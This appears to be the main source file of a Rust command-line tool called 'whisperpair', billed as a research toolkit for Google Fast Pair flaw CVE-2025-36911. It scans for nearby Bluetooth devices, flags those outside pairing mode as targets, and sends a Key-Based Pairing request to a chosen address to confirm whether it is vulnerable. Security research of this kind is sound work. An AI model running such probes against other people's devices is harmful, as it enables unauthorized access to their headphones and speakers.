mod constants;
mod crypto;
mod protocol;
mod scanner;
mod client;

use std::str::FromStr;
use anyhow::{Result, Context};
use bluer::{Adapter, Session, Address};
use clap::{Parser, Subcommand};

use constants::get_device_name;
use scanner::{find_fast_pair_devices, find_vulnerable_devices, FastPairDevice};
use client::FastPairClient;

#[derive(Parser)]
#[clap(name = "whisperpair", about = "Google Fast Pair Security Research Toolkit - CVE-2025-36911")]
struct Cli {
    #[clap(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    Scan {
        #[clap(short, long, default_value = "10.0")]
        timeout: f64,
        #[clap(short, long)]
        vulnerable_only: bool,
    },
    Verify {
        address: String,
        #[clap(short, long, help = "16-byte AES key in hex (optional)")]
        key: Option<String>,
    },
    Info {
        address: String,
    },
}

async fn get_adapter() -> Result<Adapter> {
    let session = Session::new().await.context("Failed to create BlueR session")?;
    let adapter = session.default_adapter().await.context("No Bluetooth adapter found")?;
    adapter.set_powered(true).await.context("Failed to power on adapter")?;
    Ok(adapter)
}

fn parse_hex_key(hex: &str) -> Result<[u8; 16]> {
    let bytes = hex::decode(hex).context("Invalid hex string for AES key")?;
    if bytes.len() != 16 {
        anyhow::bail!("AES key must be exactly 16 bytes (32 hex chars)");
    }
    let mut key = [0u8; 16];
    key.copy_from_slice(&bytes);
    Ok(key)
}

fn print_device(device: &FastPairDevice) {
    let mode = if device.is_in_pairing_mode { "PAIRING" } else { "paired/idle" };
    let model_str = device.model_id
        .map(|id| format!("0x{:06X} ({})", id, get_device_name(id)))
        .unwrap_or_else(|| "N/A".to_string());
    let rssi_str = device.rssi.map(|r| format!("{}dBm", r)).unwrap_or_else(|| "N/A".to_string());
    let vulnerable = !device.is_in_pairing_mode;

    println!("  Address : {}", device.address_str());
    println!("  Name    : {}", device.display_name());
    println!("  Model   : {}", model_str);
    println!("  RSSI    : {}", rssi_str);
    println!("  Mode    : {}", mode);
    println!("  Target  : {}", if vulnerable { "YES (not in pairing mode)" } else { "No (in pairing mode)" });
    println!();
}

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();

    match cli.command {
        Commands::Scan { timeout, vulnerable_only } => {
            let adapter = get_adapter().await?;

            println!("[*] Scanning for Fast Pair devices ({:.0}s)...", timeout);
            println!();

            let devices = if vulnerable_only {
                find_vulnerable_devices(&adapter, timeout).await?
            } else {
                find_fast_pair_devices(&adapter, timeout).await?
            };

            if devices.is_empty() {
                println!("[-] No Fast Pair devices found.");
            } else {
                println!("[+] Found {} device(s):", devices.len());
                println!();
                for (i, device) in devices.iter().enumerate() {
                    println!("[{}]", i + 1);
                    print_device(device);
                }
            }
        }

        Commands::Verify { address, key } => {
            let adapter = get_adapter().await?;
            let addr = Address::from_str(&address)
                .context("Invalid Bluetooth address format")?;

            let aes_key = key.as_deref().map(parse_hex_key).transpose()?;

            println!("[*] Verifying CVE-2025-36911 on {}", address);
            println!();

            let client = FastPairClient::new(adapter, addr, None, None);
            let result = client.verify_pairing_behavior(
                aes_key.as_ref(),
                None,
            ).await;

            if result.success {
                println!("[!] VULNERABLE - Device responded to KBP request outside pairing mode");
                if let Some(ref provider_addr) = result.provider_address {
                    println!("    Provider BR/EDR address : {}", provider_addr);
                }
                if let Some(ref raw) = result.raw_response {
                    println!("    Raw response             : {}", hex::encode(raw));
                }
            } else {
                println!("[-] Not vulnerable or unreachable");
                if let Some(ref err) = result.error {
                    println!("    Reason: {}", err);
                }
            }
            println!("    Response received: {}", result.response_received);
        }

        Commands::Info { address } => {
            let adapter = get_adapter().await?;
            let addr = Address::from_str(&address)
                .context("Invalid Bluetooth address format")?;

            println!("[*] Fetching device info for {}", address);
            println!();

            let client = FastPairClient::new(adapter, addr, None, None);
            match client.read_model_id().await {
                Ok(Some(model_id)) => {
                    println!("    Address    : {}", address);
                    println!("    Model ID   : 0x{:06X}", model_id);
                    println!("    Model Name : {}", get_device_name(model_id));
                }
                Ok(None) => {
                    println!("    Address    : {}", address);
                    println!("    Model ID   : N/A");
                    println!("    Model Name : Unknown");
                }
                Err(e) => {
                    println!("[-] Failed to read model ID: {}", e);
                }
            }
        }
    }

    Ok(())
}
